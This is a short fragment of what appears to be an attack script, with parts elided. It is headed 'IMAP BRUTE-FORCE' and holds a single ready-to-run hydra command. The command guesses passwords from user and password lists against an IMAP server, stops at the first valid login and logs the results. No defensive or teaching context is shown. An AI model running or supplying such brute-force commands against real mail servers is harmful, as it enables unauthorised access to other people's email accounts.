...
# ═══════════════════════════════════════════════════════════════════
# IMAP BRUTE-FORCE - ONE LINE CHANGE
# ═══════════════════════════════════════════════════════════════════
...
# Execute attack
hydra -L "$USERLIST" -P "$PASSLIST" -t "$THREADS" -f imap://"$TARGET:$PORT" | tee -a "$PROJECT_ROOT/logs/imap_attack.log"
